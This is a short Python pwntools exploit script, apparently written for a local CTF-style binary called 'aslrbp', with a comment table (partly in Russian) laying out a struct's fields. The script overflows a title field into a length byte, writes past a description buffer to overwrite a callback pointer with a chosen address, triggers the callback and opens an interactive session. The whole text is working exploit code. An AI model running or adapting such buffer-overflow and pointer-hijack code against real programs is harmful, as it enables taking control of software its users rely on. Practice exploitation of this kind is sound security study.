from pwn import *

#context.log_level = "DEBUG"
p = process(["./aslrbp", "./2"])

p.sendlineafter(b"> ", "1")
p.sendlineafter(b"Title: ", b"A"*16+b"Z")
p.sendlineafter(b"> ", "2")
p.sendlineafter(b"New text", b"A"*71+p64(0x0000000100000548))
"""
Offset | Size | Field
-------+------+---------------------------
0      | 16   | title[16]
16     | 1    | len
17     | 64   | desc[64]
81     | 7    | padding (автоматический)
88     | 8    | cb (указатель)
"""
p.sendlineafter(b"> ", "4")

p.interactive()
